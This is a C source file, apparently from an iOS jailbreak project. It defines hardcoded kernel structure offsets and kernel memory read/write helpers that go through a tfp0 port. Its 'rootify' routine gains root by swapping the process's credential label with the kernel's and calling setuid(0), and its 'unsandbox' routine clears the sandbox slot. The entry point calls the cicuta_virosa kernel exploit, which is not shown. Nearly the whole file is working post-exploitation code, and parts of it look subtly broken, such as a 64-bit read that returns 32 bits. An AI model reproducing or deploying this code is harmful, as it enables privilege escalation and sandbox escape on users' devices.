//
//  0pwn.c
//  0pwn
//
//  Created by Zachary Keffaber on 7/11/22.
//

#include "0pwn.h"
#include "cicuta_virosa/cicuta_virosa.h"

#include <Foundation/Foundation.h>
#include <mach/mach.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <UIKit/UIKit.h>
#include <sys/mount.h>
#include <spawn.h>
#include <copyfile.h>
#include <sys/sysctl.h>
#include <sys/stat.h>

unsigned off_p_pid = 0x68;               // proc_t::p_pid
unsigned off_task = 0x10;                // proc_t::task
unsigned off_p_uid = 0x30;               // proc_t::p_uid
unsigned off_p_gid = 0x34;               // proc_t::p_uid
unsigned off_p_ruid = 0x38;              // proc_t::p_uid
unsigned off_p_rgid = 0x3c;              // proc_t::p_uid
unsigned off_p_ucred = 0x100;            // proc_t::p_ucred
unsigned off_p_fd = 0x108;               // proc_t::p_fd
unsigned off_p_csflags = 0x2a8;          // proc_t::p_csflags
unsigned off_p_comm = 0x268;             // proc_t::p_comm
unsigned off_p_textvp = 0x248;           // proc_t::p_textvp
unsigned off_p_textoff = 0x250;          // proc_t::p_textoff
unsigned off_p_cputype = 0x2c0;          // proc_t::p_cputype
unsigned off_p_cpu_subtype = 0x2c4;      // proc_t::p_cpu_subtype

unsigned off_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
unsigned off_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
unsigned off_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
unsigned off_itk_space = 0x308;          // task_t::itk_space

unsigned off_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
unsigned off_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
unsigned off_ip_kobject = 0x68;          // ipc_port_t::ip_kobject

unsigned off_special = 2 * sizeof(long); // host::special
unsigned off_ipc_space_is_table = 0x20;  // ipc_space::is_table?..

unsigned off_ucred_cr_uid = 0x18;        // ucred::cr_uid
unsigned off_ucred_cr_ruid = 0x1c;       // ucred::cr_ruid
unsigned off_ucred_cr_svuid = 0x20;      // ucred::cr_svuid
unsigned off_ucred_cr_ngroups = 0x24;    // ucred::cr_ngroups
unsigned off_ucred_cr_groups = 0x28;     // ucred::cr_groups
unsigned off_ucred_cr_rgid = 0x68;       // ucred::cr_rgid
unsigned off_ucred_cr_svgid = 0x6c;      // ucred::cr_svgid
unsigned off_ucred_cr_label = 0x78;      // ucred::cr_label

unsigned off_amfi_slot = 0x8;
unsigned off_sandbox_slot = 0x10;

unsigned off_v_type = 0x70;              // vnode::v_type
unsigned off_v_id = 0x74;                // vnode::v_id
unsigned off_v_ubcinfo = 0x78;           // vnode::v_ubcinfo
unsigned off_v_flags = 0x54;             // vnode::v_flags

unsigned off_ubcinfo_csblobs = 0x50;     // ubc_info::csblobs

unsigned off_csb_cputype = 0x8;          // cs_blob::csb_cputype
unsigned off_csb_flags = 0x12;           // cs_blob::csb_flags
unsigned off_csb_base_offset = 0x16;     // cs_blob::csb_base_offset
unsigned off_csb_entitlements_offset = 0x90; // cs_blob::csb_entitlements
unsigned off_csb_signer_type = 0xA0;     // cs_blob::csb_signer_type
unsigned off_csb_platform_binary = 0xA4; // cs_blob::csb_platform_binary
unsigned off_csb_platform_path = 0xA8;   // cs_blob::csb_platform_path
unsigned off_csb_cd = 0x80;              // cs_blob::csb_cd

unsigned off_t_flags = 0x3a0; // task::t_flags

unsigned off_v_mount = 0xd8;             // vnode::v_mount
unsigned off_v_specinfo = 0x78;          // vnode::v_specinfo
unsigned off_specflags = 0x10;
unsigned off_mnt_flag = 0x70;            // mount::mnt_flag
unsigned off_mnt_data = 0x8f8;           // mount::mnt_data

unsigned off_getExternelTrapForIndex = 0xb7; // IOUserClient::getExternalTrapForIndex

#define    CS_VALID        0x0000001    /* dynamically valid */
#define CS_ADHOC        0x0000002    /* ad hoc signed */
#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
#define CS_INSTALLER        0x0000008    /* has installer entitlement */

#define    CS_HARD            0x0000100    /* don't load invalid pages */
#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
#define CS_CHECK_EXPIRATION    0x0000400    /* force expiration checking */
#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */
#define CS_ENFORCEMENT        0x0001000    /* require enforcement */
#define CS_REQUIRE_LV        0x0002000    /* require library validation */
#define CS_ENTITLEMENTS_VALIDATED    0x0004000

#define    CS_ALLOWED_MACHO    0x00ffffe

#define CS_EXEC_SET_HARD    0x0100000    /* set CS_HARD on any exec'ed process */
#define CS_EXEC_SET_KILL    0x0200000    /* set CS_KILL on any exec'ed process */
#define CS_EXEC_SET_ENFORCEMENT    0x0400000    /* set CS_ENFORCEMENT on any exec'ed process */
#define CS_EXEC_SET_INSTALLER    0x0800000    /* set CS_INSTALLER on any exec'ed process */

#define CS_KILLED        0x1000000    /* was killed by kernel for invalidity */
#define CS_DYLD_PLATFORM    0x2000000    /* dyld used to load this is a platform binary */
#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */
#define CS_PLATFORM_PATH    0x8000000    /* platform binary by the fact of path (osx only) */

#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
#define CS_SIGNED         0x20000000  /* process has a signature (may have gone invalid) */
#define CS_DEV_CODE         0x40000000  /* code is dev signed, cannot be loaded into prod signed code (will go away with rdar://problem/28322552) */

extern uint64_t our_proc_kAddr;
extern uint32_t tfp0_port;

kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);

uint32_t kread_uint64(uint64_t addr, mach_port_t tfp0) {
    vm_size_t bytesRead=0;
    uint32_t ret = 0;
    vm_read_overwrite(tfp0,addr,sizeof(uint64_t),(vm_address_t)&ret,&bytesRead);
    return ret;
}

uint32_t kread_uint32(uint32_t addr, mach_port_t tfp0) {
    vm_size_t bytesRead=0;
    uint32_t ret = 0;
    vm_read_overwrite(tfp0,addr,4,(vm_address_t)&ret,&bytesRead);
    return ret;
}

void kwrite_uint32(uint32_t addr, uint32_t value, mach_port_t tfp0) {
    vm_write(tfp0,addr,(vm_offset_t)&value,4);
}

void kwrite_uint64(uint32_t addr, uint64_t value, mach_port_t tfp0) {
    vm_write(tfp0,addr,(vm_offset_t)&value,sizeof(uint64_t));
}

size_t kread(uint64_t where, void *p, size_t size, mach_port_t tfp0) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            printf("Kernel Memory: error on kread(0x%016llx)\n", where);
            break;
        }
        offset += sz;
    }
    return offset;
}

uint32_t rk32(uint64_t where, mach_port_t tfp0) {
    uint32_t out;
    kread(where, &out, sizeof(uint32_t), tfp0);
    return out;
}

uint64_t rk64(uint64_t where, mach_port_t tfp0) {
    uint64_t out;
    kread(where, &out, sizeof(uint64_t), tfp0);
    return out;
}

size_t kwrite(uint64_t where, const void *p, size_t size, mach_port_t tfp0) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0, where + offset, (mach_vm_offset_t)p + offset, (int)chunk);
        if (rv) {
            printf("Kernel Memory: error on kwrite(0x%016llx)\n", where);
            break;
        }
        offset += chunk;
    }
    return offset;
}

void wk32(uint64_t where, uint32_t what, mach_port_t tfp0) {
    uint32_t _what = what;
    kwrite(where, &_what, sizeof(uint32_t), tfp0);
}


void wk64(uint64_t where, uint64_t what, mach_port_t tfp0) {
    uint64_t _what = what;
    kwrite(where, &_what, sizeof(uint64_t), tfp0);
}

uint64_t find_da_allproc(uint64_t ourproc, mach_port_t tfp0) {
    uint64_t allproc = 0;
    uint64_t proc = ourproc;
    while (proc != 0) {
        if (rk64(rk32(proc + 8, tfp0), tfp0) != proc) {
            NSLog(@"found allproc at 0x%llx\n",proc);
            allproc = proc;
        }
        proc = rk64(proc + 8, tfp0);
    }
    return allproc;
}

uint64_t proc_for_pid(pid_t pid, uint64_t ourproc, mach_port_t tfp0) {
    uint64_t proc = rk64(find_da_allproc(ourproc, tfp0), tfp0), pd;
    while (proc) { //iterate over all processes till we find the one we're looking for
        pd = rk32(proc + off_p_pid, tfp0);
        if (pd == pid) return proc;
        proc = rk64(proc, tfp0);
    }
    
    return 0;
}

bool rootify(pid_t pid, mach_port_t tfp0, uint64_t ourproc) {
    if (!pid) return NO;
    
    uint64_t proc = ourproc; //proc_of_pid(pid, tfp0);
    uint64_t ucred = rk64(proc + off_p_ucred, tfp0);
    
    uint64_t allproc = find_da_allproc(ourproc, tfp0);
    pid_t our_pid = pid;
    proc = rk64(allproc,tfp0);
    
    uint64_t kernel_proc = proc_for_pid(pid, ourproc, tfp0);
    uint64_t kern_ucred = rk64(kernel_proc + 0x100,tfp0);
    uint64_t self_ucred = rk64(ourproc + 0x100,tfp0);
            
    uint64_t our_label = rk64(self_ucred + 0x78,tfp0);
    wk64(self_ucred + 0x78, rk64(kern_ucred + 0x78,tfp0),tfp0);
    wk32(self_ucred + 0x20, (uint32_t)0,tfp0);
            
    NSLog(@"about to setuid 0...\n");
    setuid(0);
    setuid(0);
    wk64(self_ucred + 0x78, our_label, tfp0);
    NSLog(@"we did setuid 0\n");
    
    NSLog(@"escasing function...\n");
    
    return true;
}

void unsandbox(pid_t pid, mach_port_t tfp0, uint64_t ourproc) {
    uint64_t target_process;
    uint64_t ucred;
    uint64_t sb_cr_label;
    uint64_t default_creds;
    target_process = proc_for_pid(pid, ourproc, tfp0);
    ucred = rk64(target_process + off_p_ucred, tfp0);
    sb_cr_label = rk64(ucred + off_ucred_cr_label, tfp0);
    default_creds = rk64(sb_cr_label + off_sandbox_slot, tfp0);
    wk64(sb_cr_label + off_sandbox_slot, 0, tfp0);
}

int openpwnage64(void){
    cicuta_virosa();
    return 0;
}
